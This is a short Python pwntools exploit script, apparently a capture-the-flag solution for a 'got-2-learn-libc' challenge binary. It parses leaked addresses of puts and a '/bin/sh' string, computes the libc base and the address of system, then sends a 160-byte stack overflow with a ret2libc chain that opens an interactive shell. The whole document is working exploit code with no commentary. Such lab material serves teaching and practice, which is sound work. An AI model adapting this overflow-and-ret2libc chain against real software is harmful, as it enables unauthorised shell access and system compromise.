from pwn import *
context.log_level = 'debug'
context(terminal=['tmux', 'splitw', '-h'])
libc = ELF('/lib32/libc.so.6')
puts = libc.symbols['puts']

p = process('/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/vuln')
p.recvuntil('puts: ')
l = p.recvline()
real_puts = int(l, 16)
p.recvuntil('useful_string: ')
l = p.recvline()
cmd = int(l, 16)

print('original puts: ' + hex(puts))
print('real puts: ' + hex(real_puts))
print('/bin/sh: ' + hex(cmd))

libc_base = real_puts - puts
libc_system = libc_base + libc.symbols['system']

print('libc base addr: ' + hex(libc_base))
print('libc system: ' + hex(libc_system))

# gdb.attach(p)
raw_input()
p.send('A'*160 + p32(libc_system) + p32(cmd) * 10 + '\n')
p.interactive()